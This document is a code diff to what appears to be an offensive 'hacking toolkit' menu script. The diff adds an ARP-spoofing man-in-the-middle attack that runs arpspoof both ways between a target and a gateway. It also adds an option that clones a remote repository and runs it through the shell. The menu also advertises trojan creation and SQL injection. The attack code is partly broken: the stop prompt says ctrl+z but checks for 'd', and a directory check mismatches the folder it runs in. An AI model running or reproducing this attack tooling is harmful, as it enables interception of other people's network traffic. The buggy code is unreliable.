@@ -2,6 +2,9 @@ from subprocess import run, PIPE
 import os
 import signal
 from colorama import Fore
+import subprocess
+import keyboard
+import threading
 
 def signal_handler(sig, frame):
     print("")
@@ -235,6 +238,29 @@ def update_tool():
     except Exception as e:
         print("Error updating tool:", e)
         main_menu()
+        
+def MITM():
+    clear_screen()
+    print("\n[0] Back\n")
+    wifi_ip = input("Your Wifi IP > ")
+    target_ip = input("Target IP > ")
+
+    if wifi_ip == "0":
+        main_menu()
+    else:
+        # İlk arpspoof komutunu arka planda çalıştır
+        process1 = subprocess.Popen(f"arpspoof -i eth0 -t {wifi_ip} {target_ip}", shell=True)
+        # İkinci arpspoof komutunu arka planda, IP'lerin yerini değiştirerek çalıştır
+        process2 = subprocess.Popen(f"arpspoof -i eth0 -t {target_ip} {wifi_ip}", shell=True)
+
+        print("\nPress double ctrl + z to stop the attack.\n")
+        while True:
+            stop_command = input().strip().lower()
+            if stop_command == 'd':
+                os.kill(process1.pid, signal.SIGTERM)
+                os.kill(process2.pid, signal.SIGTERM)
+                print("Processes terminated.")
+                break
 
 def reboot_system():
     clear_screen()
@@ -247,6 +273,14 @@ def threat_manager():
     else:
         run("cd .. && git clone https://github.com/NoNameZusy/ThreatManager.git", shell=True)
         run("cd .. && cd ThreatManager && python3 OpenThreat.py", shell=True)
+        
+def ZusyFramework():
+    clear_screen()
+    if os.path.isdir("ZusyFramework"):
+        run("cd .. && cd ZusyFramework && python3 ZusyFramework.py", shell=True)
+    else:
+        run("cd .. && git clone https://github.com/NoNameZusy/ZusyFramework.git", shell=True)
+        run("cd .. && cd ZusyFramework && python3 ZusyFramework.py", shell=True)        
         
 def No_Escape():
     if os.path.isdir("No_Escape"):
@@ -289,10 +323,10 @@ def main_menu():
       ╔╝═╚═╣╚═╝║╚═╝║─║║──
       ╚════╩═══╩═══╝─╚╝──
 -------{ By No_Name.exe }-------
-                        v 1.6
+                        v 1.7
     """
     print(logo)
-    print("[1] Nmap Scan\n[2] Open Metasploit\n[3] Social Engineering\n[4] SQL Injection\n[5] Commix\n[6] Restart System\n[7] Become Windows (on/off)\n[8] Upgrade System\n[9] Password Found\n[10] System About\n[11] Create Trojan\n[12] IP-Tracer\n[13] Netdiscover\n[14] ThreatManager\n[15] Port Scan\n[16] InformationManager\n[17] Wifi Scan (eth0)\n[18] No_Escape (BETA)\n[99] Exit\n"
+    print("[1] Nmap Scan\n[2] Open Metasploit\n[3] Social Engineering\n[4] SQL Injection\n[5] Commix\n[6] Restart System\n[7] Become Windows (on/off)\n[8] Upgrade System\n[9] Password Found\n[10] System About\n[11] Create Trojan\n[12] IP-Tracer\n[13] Netdiscover\n[14] ThreatManager\n[15] Port Scan\n[16] InformationManager\n[17] Wifi Scan (eth0)\n[18] No_Escape (BETA)\n[19] MITM Attack\n[20] ZusyFramework (BETA)\n[99] Exit\n"
     "\n[100] Update\n[101] Info\n")
     choice = input("Zusy ~$ ")
     if choice == "1":
@@ -330,7 +364,11 @@ def main_menu():
     elif choice == "17":
         wifi_scan()
     elif choice == "18":
-        No_Escape()                                 
+        No_Escape()
+    elif choice == "19":
+        MITM()    
+    elif choice == "20":
+    	ZusyFramework()                                     
     elif choice == "100":
         update_tool()
     elif choice == "101":
